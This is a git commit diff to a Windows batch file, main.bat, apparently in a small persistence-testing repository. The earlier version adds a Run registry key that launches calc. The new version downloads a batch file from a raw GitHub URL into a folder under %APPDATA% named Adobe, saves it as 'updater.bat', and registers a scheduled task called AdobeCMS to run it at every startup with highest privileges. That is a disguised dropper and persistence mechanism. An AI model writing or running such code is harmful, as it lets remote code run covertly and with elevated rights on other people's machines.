dcea77323eb3c2d9c07e73cfe791cdf2bbaea741
qufyu <162769381+qufyu@users.noreply.github.com>
2024-03-09 12:42:02 -0500

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,1 +1,4 @@
-reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v mainTest /t REG_SZ \d "cmd c/ calc"
+@echo off
+mkdir -p %APPDATA%\Adobe
+curl -s https://raw.githubusercontent.com/qufyu/0024/main/main.bat > %APPDATA%\Adobe\updater.bat
+schtasks /create /sc onstart /tn AdobeCMS /tr %APPDATA%\Adobe\updater.bat /f /rl HIGHEST
